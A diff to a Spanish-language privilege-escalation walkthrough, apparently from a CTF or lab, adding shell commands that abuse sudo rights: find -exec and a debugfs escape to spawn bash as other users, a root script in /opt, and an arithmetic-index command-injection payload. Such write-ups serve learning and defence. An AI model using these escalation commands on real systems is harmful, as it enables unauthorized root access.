@@ -192,13 +192,18 @@ sudo -u rafa /usr/bin/find . -exec /bin/bash \;
 ```bash
 sudo -u ruben /usr/sbin/debugfs
 ```
-
+```bash
+!/bin/bash
+```
 Con estos pasos, se accedió a un script en el directorio `/opt/` que permitió ejecutar el siguiente comando con privilegios elevados:
 
 **Comando ejecutado:**
 
 ```bash
 sudo /bin/bash /opt/pinguin.sh
+```
+```bash
+Alejandro: a[$(/bin/bash>2)]+42
 ```
 
 Finalmente, con la ejecución de este script, se logró escalar privilegios hasta obtener acceso completo como root.
